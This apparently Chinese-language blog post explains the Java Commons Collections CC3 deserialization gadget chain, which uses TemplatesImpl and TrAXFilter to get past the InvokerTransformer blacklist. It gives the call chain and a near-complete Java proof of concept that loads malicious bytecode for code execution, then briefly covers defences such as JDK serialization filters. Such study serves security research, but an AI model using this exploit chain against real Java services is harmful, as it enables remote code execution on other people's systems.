---
title: "Java CC · CC3：TemplatesImpl 与 TrAXFilter"
series: java-cc-deserialization
series_order: 4
date: 2026-04-25 10:20:00 +0800
categories:
  - javaCC
---
# CC3：TemplatesImpl 字节码加载与黑名单绕过


### 为什么需要 CC3？
随着 CC 3.2.2 和 4.1 版本的发布，`InvokerTransformer` 被加入了反序列化黑名单，直接调用 `Runtime.getRuntime().exec()` 的路被堵死了。CC3 的思路是：既然不能直接调用方法，那就加载任意字节码。它引入了 `TemplatesImpl` 和 `TrAXFilter`，通过动态加载类来执行命令。

### 核心原理
CC3 的核心执行器由 `InstantiateTransformer` 和 `TrAXFilter` 组成。
*   `TrAXFilter` 的构造方法中会调用 `TemplatesImpl.newTransformer()`。
*   `InstantiateTransformer` 可以实例化任意类。
*   `TemplatesImpl` 加载恶意字节码，在静态代码块中执行命令。

**调用链：**
```text
入口
  → LazyMap.get()/TransformedMap.checkSetValue()
    → ChainedTransformer.transform()
      → ConstantTransformer.transform() → 返回 TrAXFilter.class
        → InstantiateTransformer.transform() → 实例化 TrAXFilter
          → TrAXFilter 构造方法
            → TemplatesImpl.newTransformer()
              → defineClass() → 静态代码块执行
```

### 完整 POC
这里复用 CC1 的 `AnnotationInvocationHandler` 作为入口。

```java
package com.nk7;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3 {
    public static void main(String[] args) throws Exception {
        // 1. 构造恶意字节码
        byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode();
        TemplatesImpl tmpl = new TemplatesImpl();
        setFieldValue(tmpl, "_bytecodes", new byte[][]{code});
        setFieldValue(tmpl, "_name", "HelloTemplatesImpl");
        setFieldValue(tmpl, "_tfactory", new TransformerFactoryImpl());

        // 2. CC3 核心执行器
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        // 3. 入口
        Map innerMap = new HashMap();
        innerMap.put("value", "xxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Target.class, outerMap);

        serialize(obj);
        unserialize("ser.bin");
    }
    // setFieldValue 及恶意类 RCETest 省略，参考上文
}
```

### 绕过与防护分析
CC3 成功绕过了 CC 库对 `InvokerTransformer` 的黑名单限制。但是，它依然受限于 JDK 8u71 对 `AnnotationInvocationHandler` 入口的修复。此外，`InstantiateTransformer` 在后续的 CC 版本中也逐渐被关注，使用 JDK 序列化过滤器可以有效地拦截此类非标准类的反序列化。
